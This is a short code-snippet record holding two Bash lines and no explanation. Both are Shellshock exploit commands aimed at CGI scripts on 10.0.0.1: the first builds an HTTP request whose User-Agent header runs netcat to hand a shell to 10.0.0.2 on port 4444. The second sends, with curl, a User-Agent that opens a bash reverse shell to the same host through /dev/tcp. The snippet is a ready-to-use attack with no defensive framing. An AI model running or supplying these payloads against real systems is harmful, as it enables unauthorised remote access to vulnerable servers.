---
id: c1ba26b6-adf4-40bd-821a-d26e3da1f9de
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:55:56.800866+00:00'
updated_at: '2023-04-06T03:55:56.808014+00:00'
---

# Code Snippet c1ba26b6

**Language**: Bash

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
```
